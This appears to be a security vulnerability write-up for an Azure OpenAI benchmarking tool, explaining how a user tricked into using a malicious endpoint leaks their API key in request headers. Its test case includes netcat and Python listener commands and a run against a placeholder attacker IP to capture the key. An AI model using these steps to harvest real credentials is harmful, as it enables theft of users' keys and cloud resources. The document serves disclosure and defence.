### Vulnerability List:

* Vulnerability Name: API Key Exposure through Malicious Endpoint
* Description:
    1. An attacker crafts a malicious endpoint that mimics the expected behavior of an Azure OpenAI service for the benchmarking tool.
    2. The attacker then socially engineers a user into using this malicious endpoint URL with the benchmarking tool. This could be achieved through phishing, misleading instructions, or other social engineering techniques.
    3. The user, believing they are running a legitimate benchmark, executes the tool with their valid Azure OpenAI API key and the attacker's malicious endpoint URL.
    4. The benchmarking tool, as designed, sends requests to the specified endpoint, including the Azure OpenAI API key in the `api-key` header for authentication.
    5. The attacker's malicious endpoint captures and logs the incoming request headers, including the user's Azure OpenAI API key.
    6. The attacker now has access to the user's Azure OpenAI API key, which can be used to access and utilize the user's Azure OpenAI resources.
* Impact:
    Compromise of the user's Azure OpenAI API key. This allows the attacker to:
    * Access the user's Azure OpenAI service and resources.
    * Incur costs on the user's Azure subscription by making requests to the OpenAI service.
    * Potentially access or manipulate any data or models associated with the compromised Azure OpenAI resource, depending on the permissions associated with the API key.
* Vulnerability Rank: High
* Currently Implemented Mitigations:
    * None in the code itself.
    * The `README.md` file includes warnings that the code is for testing purposes only and should not be used in production. However, it does not specifically address the risk of API key exposure through malicious endpoints.
* Missing Mitigations:
    * Input validation for the `--api-base-endpoint` command-line argument to ensure it points to a trusted Azure OpenAI endpoint. While complete validation is difficult, basic checks like ensuring the domain is within `openai.azure.com` could be implemented as a starting point.
    * Explicit warning in the `README.md` and command-line help output about the security risks of using the tool with untrusted endpoints and the potential for API key exposure.
    * Consider alternative methods for authentication during benchmarking that do not involve sending the API key to the endpoint if feasible, although this might be complex given the current design of Azure OpenAI authentication.
* Preconditions:
    * The attacker must successfully socially engineer a user to run the benchmarking tool against a malicious endpoint.
    * The user must have a valid Azure OpenAI API key configured in the `OPENAI_API_KEY` environment variable.
    * The user must execute the benchmarking tool with the `--api-base-endpoint` argument pointing to the attacker's malicious endpoint.
* Source Code Analysis:
    1. **`benchmark/oairequester.py`**: The `OAIRequester` class is responsible for making requests to the Azure OpenAI endpoint.
    2. `__init__(self, api_key: str, url: str, backoff=False)`: The constructor takes the `api_key` and `url` as input and stores them as instance attributes.
    3. `async def call(self, session:aiohttp.ClientSession, body: dict) -> RequestStats`: This method sends the API request.
    4. `headers = {"api-key": self.api_key, ...}`:  The `api_key` provided during `OAIRequester` initialization is directly included in the request headers.
    5. `response = await session.post(self.url, headers=headers, json=body)`: The request is sent to `self.url`, which is taken directly from user input via command-line argument, with the API key in the headers.

    ```
    User Input (Command Line): --deployment gpt-4 <MALICIOUS_ENDPOINT_URL>
        |
        V
    benchmark/loadcmd.py:_run_load()
        |
        V
    OAIRequester Initialization: OAIRequester(api_key, <MALICIOUS_ENDPOINT_URL>)
        |
        V
    benchmark/oairequester.py:call()
        |
        V
    HTTP Request to <MALICIOUS_ENDPOINT_URL> with 'api-key' header
        |
        V
    Attacker's Malicious Endpoint: Receives request and captures 'api-key' header
    ```

* Security Test Case:
    1. **Setup Attacker Server:** On a machine controlled by the attacker, start a simple HTTP server that listens on port 8080 and logs all incoming request headers. For example, using Python:
        ```bash
        python -m http.server 8080
        ```
        Or using `netcat`:
        ```bash
        mkfifo /tmp/req
        while true; do nc -l -p 8080 < /tmp/req | tee /tmp/req; done
        ```
    2. **Prepare Benchmarking Environment:** On a separate machine (the user's machine):
        * Set the environment variable `OPENAI_API_KEY` to a **dummy but realistic-looking API key** (e.g., `sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`). **Do not use a real API key.**
        * Clone the benchmarking tool repository and install the requirements.
    3. **Execute Benchmarking Tool with Malicious Endpoint:** Run the benchmarking tool's load command, replacing `<ATTACKER_IP>` with the IP address of the attacker's server:
        ```bash
        python -m benchmark.bench load --deployment gpt-4 http://<ATTACKER_IP>:8080
        ```
    4. **Analyze Attacker Server Logs:** Check the logs of the HTTP server running on the attacker's machine.
    5. **Verify API Key Exposure:** The logs should contain a POST request to `/openai/deployments/gpt-4/chat/completions`. Within the headers of this request, you should find the `api-key` header, and its value should be the dummy API key you set in step 2. This confirms that the API key is transmitted to the attacker-controlled endpoint.